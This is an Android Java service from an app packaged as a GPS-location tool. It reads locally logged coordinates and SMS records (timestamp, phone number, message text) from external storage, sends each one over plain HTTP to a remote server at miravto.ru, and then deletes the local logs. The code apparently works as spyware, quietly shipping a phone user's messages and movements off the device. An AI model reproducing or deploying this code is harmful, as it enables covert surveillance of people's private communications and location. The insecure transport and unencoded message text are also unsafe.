package com.camo.htcgpslocation;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import android.support.annotation.Nullable;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;

/**
 * Created by GAlekseev on 23.11.2017.
 */

public class UploadService extends IntentService{

    private static final String TAG = "UploadService";

    public UploadService(){
        super("UploadService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        boolean uploadSuccess = true;
        Log.d(TAG, "Alarm intent running");
        LocationData[] data = readStorage();
        if (data != null && data.length>0) {
            uploadSuccess = uploadData(data);
            if (uploadSuccess) {
                deleteStorage();
            }
        }

        if (uploadSuccess){
            SMSData[] smsData = readSMSStorage();
            if (smsData != null && smsData.length>0){
                Log.v(TAG, "Messages found: "+smsData.length);
                if (uploadSMS(smsData))
                {
                    deleteSMSStorage();
                }
            }
        }
    }

    private void deleteSMSStorage() {
        Log.v(TAG, "Start emptying storage");
        File path = Environment.getExternalStorageDirectory();
        File file = new File(path, "mes.log");

        if (file.exists()) {
            Log.v(TAG, "Deleting file");
            file.delete();
            try {
                Log.v(TAG, "Recreating file");
                file.createNewFile();
            }
            catch (IOException e){
                Log.e(TAG, e.getMessage());
            }
        }
    }

    private boolean uploadSMS(SMSData[] smslist) {
        boolean success = false;

        Log.v(TAG, "Start data upload");

        for (SMSData sms : smslist) {
            HttpURLConnection urlConnection = null;
            try {
                String strUrl = "http://www.miravto.ru/sms.php?t=" + sms.Datetime + "&p=" + sms.PhoneNumber + "&m=" +  sms.Message;
                Log.i(TAG, strUrl);
                URL url = new URL(strUrl);
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.getResponseCode();
            } catch (Exception e) {
                Log.e(TAG, e.getMessage());
                return false;
            } finally {
                urlConnection.disconnect();
            }
        }

        return true;
    }

    private SMSData[] readSMSStorage() {
        Log.v(TAG, "Start reading storage");
        ArrayList<SMSData> smslist = new ArrayList<SMSData>();

        File path = Environment.getExternalStorageDirectory();
        File file = new File(path, "mes.log");
//        Log.v(TAG, file.getAbsolutePath());

        if (!file.exists())
            return null;

        try {
            BufferedReader br = new BufferedReader(new FileReader(file));
            String line;
            String[] parts;

            while ((line = br.readLine()) != null) {
                parts = line.split(";");
                if (parts.length == 3)
                {
                    SMSData data = new SMSData(parts[0], parts[1], parts[2]);
                    smslist.add(data);
                }
            }
            br.close();
            return  smslist.toArray(new SMSData[smslist.size()]);
        } catch (IOException e){
            Log.e(TAG, e.getMessage());
            return null;
        }
    }

    private void deleteStorage() {
        Log.v(TAG, "Start emptying storage");
        File path = Environment.getExternalStorageDirectory();
        File file = new File(path, "loc.log");

        if (file.exists()) {
            Log.v(TAG, "Deleting file");
            file.delete();
            try {
                Log.v(TAG, "Recreating file");
                file.createNewFile();
            }
            catch (IOException e){
                Log.e(TAG, e.getMessage());
            }
        }
    }

    private boolean uploadData(LocationData[] locations) {
        boolean success = false;

        Log.v(TAG, "Start data upload");

        for (LocationData loc : locations) {
            HttpURLConnection urlConnection = null;
            try {
                String strUrl = "http://www.miravto.ru/agps.php?lat=" + loc.Latitude + "&lon=" + loc.Longtitude + "&t=" + loc.Datetime;
                Log.i(TAG, strUrl);
                URL url = new URL(strUrl);
                urlConnection = (HttpURLConnection) url.openConnection();
                urlConnection.getResponseCode();
            } catch (Exception e) {
                Log.e(TAG, e.getMessage());
                return false;
            } finally {
                urlConnection.disconnect();
            }
        }

        return true;
    }

    private LocationData[] readStorage() {
        Log.v(TAG, "Start reading storage");
        ArrayList<LocationData> locations = new ArrayList<LocationData>();

        File path = Environment.getExternalStorageDirectory();
        File file = new File(path, "loc.log");
//        Log.v(TAG, file.getAbsolutePath());

        if (!file.exists())
            return null;

        try {
            BufferedReader br = new BufferedReader(new FileReader(file));
            String line;
            String[] parts;

            while ((line = br.readLine()) != null) {
                parts = line.split(";");
                if (parts.length == 3)
                {
                    LocationData data = new LocationData(parts[0], parts[1], parts[2]);
                    locations.add(data);
                }
            }
            br.close();
            return  locations.toArray(new LocationData[locations.size()]);
        } catch (IOException e){
            Log.e(TAG, e.getMessage());
            return null;
        }

    }
}

